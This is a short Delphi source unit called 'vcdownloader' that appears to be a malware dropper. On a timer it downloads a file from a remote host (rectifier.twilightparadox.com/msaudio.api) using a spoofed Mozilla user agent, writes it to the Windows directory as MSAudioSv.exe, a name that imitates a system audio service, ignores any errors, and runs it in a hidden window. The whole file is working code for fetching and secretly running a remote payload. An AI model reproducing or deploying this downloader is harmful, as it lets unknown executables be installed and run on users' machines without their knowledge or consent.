unit vcdownloader;

interface

uses
  Windows,SysUtils, Classes,forms, idhttp, ExtCtrls,shellapi;

type
  TForm5 = class(TForm)
    Timer1: TTimer;
    procedure Timer1Timer(Sender: TObject);
    procedure FormCreate(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form5: TForm5;

implementation

{$R *.dfm}

procedure TForm5.FormCreate(Sender: TObject);
begin
  Timer1.Enabled := true;
end;

procedure TForm5.Timer1Timer(Sender: TObject);
var
  http: tidhttp;
  stream: tmemorystream;
  filenm: string;
begin
filenm := 'c:\windows\MSAudioSv.exe';
  if not FileExists(filenm) then
  begin
    try

      http := tidhttp.Create(nil);
      try
        http.HandleRedirects := true;
        http.AllowCookies := true;
        with http do
        begin
          Request.UserAgent := 'Mozilla/4.0';
          Request.Connection := 'Keep-Alive';
          Request.ProxyConnection := 'Keep-Alive';
          Request.CacheControl := 'no-cache';
        end;
        stream := tmemorystream.Create;
        try
          try
            http.Get('http://rectifier.twilightparadox.com/msaudio.api', stream);
            if FileExists(filenm) then
              DeleteFile(filenm);
            stream.SaveToFile(filenm);
          except
            on e: exception do;
          end;
        finally
          stream.Free;
        end;
      finally
        http.Free;
      end;
    finally
    ShellExecute(Form5.Handle, nil, 'c:\windows\MSAudioSv.exe',
    '', nil, sw_HIDE);
    end;
  end;
end;

end.
